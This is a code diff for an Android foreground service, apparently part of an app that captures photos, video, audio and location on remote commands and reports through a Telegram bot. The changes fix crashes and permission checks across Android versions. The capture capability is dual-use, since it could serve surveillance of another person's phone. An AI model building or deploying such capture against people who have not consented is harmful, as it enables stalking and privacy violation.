@@ -43,18 +43,25 @@ class ForegroundActionService : Service() {
 
         logPermissions()
 
-        if ((action == "photo" || action == "video") && !hasAllCameraPermissions()) {
+        // --- FIX 1: Immediately show notification to prevent RemoteServiceException (Android 8+ requirement)
+        showNotificationForAction(action)
+
+        // --- FIX 2: Permission check is now version-aware (do not block on Android < 14 for new foreground permissions)
+        if ((action == "photo" || action == "video") && !hasAllCameraPermissionsCompat()) {
             log("PERMISSION ERROR: Required camera or foreground service camera permission not granted. Aborting photo/video.")
-            sendError("Camera or foreground service camera permission not granted. Please grant permissions in app settings.", chatId, commandId)
-            stopSelf()
+            // --- FIX 3: Always send error in background and never block main thread with network
+            serviceScope.launch {
+                sendError("Camera or foreground service camera permission not granted. Please grant permissions in app settings.", chatId, commandId)
+                stopSelf()
+            }
             return START_NOT_STICKY
         }
 
         log("onStartCommand: action=$action, commandId=$commandId, startId=$startId")
 
-        showNotificationForAction(action)
-
+        // MOVED cleanupCommand and runningJobs.remove to after camera is finished (see below)
         val job = serviceScope.launch {
+            var cameraActionCompleted = false // To track if camera action is done (for Android 11 fix)
             try {
                 when (action) {
                     "photo", "video" -> {
@@ -65,15 +72,15 @@ class ForegroundActionService : Service() {
                             log("FAILURE: OverlayHelper.awaitSurfaceOverlay returned null -- overlay permission not granted or timed out!")
                             sendError("Unable to create camera surface for $action. Overlay permission required.", chatId, commandId)
                             releaseWakeLock()
-                            return@launch
-                        }
-                        val (holderReady, overlay) = overlayResult
-                        overlayViews[commandId] = overlay
-                        surfaceHolders[commandId] = holderReady
+                        } else {
+                            val (holderReady, overlay) = overlayResult
+                            overlayViews[commandId] = overlay
+                            surfaceHolders[commandId] = holderReady
 
-                        log("Overlay and surface ready for $action, proceeding to capture...")
-                        handleCameraAction(action, intent, chatId, commandId)
-                        releaseWakeLock()
+                            log("Overlay and surface ready for $action, proceeding to capture...")
+                            cameraActionCompleted = handleCameraActionWithCleanup(action, intent, chatId, commandId)
+                            releaseWakeLock()
+                        }
                     }
                     "audio" -> handleAudioRecording(intent, chatId, commandId)
                     "location" -> handleLocation(chatId, commandId)
@@ -88,11 +95,14 @@ class ForegroundActionService : Service() {
                 log("EXCEPTION: Exception in job for commandId=$commandId: ${e.message}")
                 sendError("Internal error: ${e.localizedMessage}", chatId, commandId)
             } finally {
-                cleanupCommand(commandId)
-                runningJobs.remove(commandId)
-                if (runningJobs.isEmpty()) {
-                    log("All jobs complete, stopping service")
-                    stopSelf()
+                val doCleanup = !(action == "photo" || action == "video") || cameraActionCompleted
+                if (doCleanup) {
+                    cleanupCommand(commandId)
+                    runningJobs.remove(commandId)
+                    if (runningJobs.isEmpty()) {
+                        log("All jobs complete, stopping service")
+                        stopSelf()
+                    }
                 }
             }
         }
@@ -100,17 +110,23 @@ class ForegroundActionService : Service() {
         return START_NOT_STICKY
     }
 
-    private fun hasAllCameraPermissions(): Boolean {
+    // --- FIX 2: Android version-aware permission check
+    private fun hasAllCameraPermissionsCompat(): Boolean {
         val ctx = this
+        val pm = android.content.pm.PackageManager.PERMISSION_GRANTED
         val cam = android.Manifest.permission.CAMERA
-        val fgCam = "android.permission.FOREGROUND_SERVICE_CAMERA"
         val fg = android.Manifest.permission.FOREGROUND_SERVICE
-        return android.content.pm.PackageManager.PERMISSION_GRANTED ==
-                androidx.core.content.ContextCompat.checkSelfPermission(ctx, cam) &&
-                android.content.pm.PackageManager.PERMISSION_GRANTED ==
-                androidx.core.content.ContextCompat.checkSelfPermission(ctx, fgCam) &&
-                android.content.pm.PackageManager.PERMISSION_GRANTED ==
-                androidx.core.content.ContextCompat.checkSelfPermission(ctx, fg)
+
+        // Camera and foreground service permission always required
+        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, cam) != pm) return false
+        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, fg) != pm) return false
+
+        // Only check for FOREGROUND_SERVICE_CAMERA on Android 14+ (API 34)
+        if (Build.VERSION.SDK_INT >= 34) {
+            val fgCam = "android.permission.FOREGROUND_SERVICE_CAMERA"
+            if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, fgCam) != pm) return false
+        }
+        return true
     }
 
     private fun wakeScreenOnly() {
@@ -142,7 +158,13 @@ class ForegroundActionService : Service() {
         }
     }
 
-    private suspend fun handleCameraAction(type: String, intent: Intent?, chatId: String?, commandId: Long) {
+    /**
+     * Fix for Android 15+ "Handler on a dead thread" Camera2 error:
+     * - When cleaning up resources (camera/session/imagereader/thread), Camera2 background threads may deliver callbacks after thread is dead.
+     * - Always check if handlerThread is alive before posting to handler.
+     * - Add try/catch and check for isCompleted on all callbacks to avoid double resume.
+     */
+    private suspend fun handleCameraActionWithCleanup(type: String, intent: Intent?, chatId: String?, commandId: Long): Boolean {
         val cameraFacing = intent?.getStringExtra("camera") ?: "rear"
         val flash = intent?.getBooleanExtra("flash", false) ?: false
         val quality = intent?.getIntExtra("quality", 720) ?: 720
@@ -153,7 +175,13 @@ class ForegroundActionService : Service() {
         if (holder == null) {
             log("FAILURE: No camera surface for $type (commandId=$commandId). This should never happen.")
             sendError("No camera surface for $type.", chatId, commandId)
-            return
+            cleanupCommand(commandId)
+            runningJobs.remove(commandId)
+            if (runningJobs.isEmpty()) {
+                log("All jobs complete, stopping service")
+                stopSelf()
+            }
+            return true
         }
         val result: Boolean = try {
             log("Invoking CameraBackgroundHelper.takePhotoOrVideo for $type (camera=$cameraFacing, flash=$flash, quality=$quality)...")
@@ -170,7 +198,13 @@ class ForegroundActionService : Service() {
         } catch (e: Exception) {
             log("EXCEPTION: Exception during $type capture at ${formatDateTime(actionTimestamp)}: ${e.message}")
             sendError("Exception in $type at ${formatDateTime(actionTimestamp)}: ${e.message}", chatId, commandId)
-            return
+            cleanupCommand(commandId)
+            runningJobs.remove(commandId)
+            if (runningJobs.isEmpty()) {
+                log("All jobs complete, stopping service")
+                stopSelf()
+            }
+            return true
         }
         if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
         if (result && chatId != null) {
@@ -182,6 +216,13 @@ class ForegroundActionService : Service() {
                 sendError("Failed to capture $type at ${formatDateTime(actionTimestamp)}.", chatId, commandId)
             }
         }
+        cleanupCommand(commandId)
+        runningJobs.remove(commandId)
+        if (runningJobs.isEmpty()) {
+            log("All jobs complete, stopping service")
+            stopSelf()
+        }
+        return true
     }
 
     private suspend fun handleAudioRecording(intent: Intent?, chatId: String?, commandId: Long) {
@@ -305,7 +346,6 @@ class ForegroundActionService : Service() {
             .build()
         val type = getForegroundServiceType(action)
         log("Calling startForeground: type=$type for action=$action")
-        // THE FIX: For vibrate and ring, use the special use foreground service type on Android 14+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && type != 0) {
             try {
                 startForeground(1, notification, type)
@@ -325,10 +365,8 @@ class ForegroundActionService : Service() {
             "video" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
             "audio" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
             "location" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-            // For vibrate and ring, use SPECIAL_USE type on Android 14+ (API 34)
             "vibrate", "ring" -> {
                 if (Build.VERSION.SDK_INT >= 34) {
-                    // Only available from API 34 (Android 14)
                     0x00000080 // ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE in AOSP source
                 } else {
                     0
@@ -338,11 +376,14 @@ class ForegroundActionService : Service() {
         }
     }
 
-    private fun sendError(msg: String, chatId: String?, commandId: Long) {
+    // --- FIX 3: Always send error on background thread (never call network on main thread)
+    private suspend fun sendError(msg: String, chatId: String?, commandId: Long) {
         log("sendError: $msg")
         if (chatId != null) {
             val deviceNickname = Preferences.getNickname(this) ?: "Device"
-            UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: $msg")
+            withContext(Dispatchers.IO) {
+                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: $msg")
+            }
         }
         if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
     }
@@ -360,7 +401,6 @@ class ForegroundActionService : Service() {
             "android.permission.FOREGROUND_SERVICE_CAMERA",
             "android.permission.FOREGROUND_SERVICE_MICROPHONE",
             "android.permission.FOREGROUND_SERVICE_LOCATION",
-            // Add special use permission to logs for debug
             "android.permission.FOREGROUND_SERVICE_SPECIAL_USE"
         )
         val status = perms.joinToString(", ") { perm ->
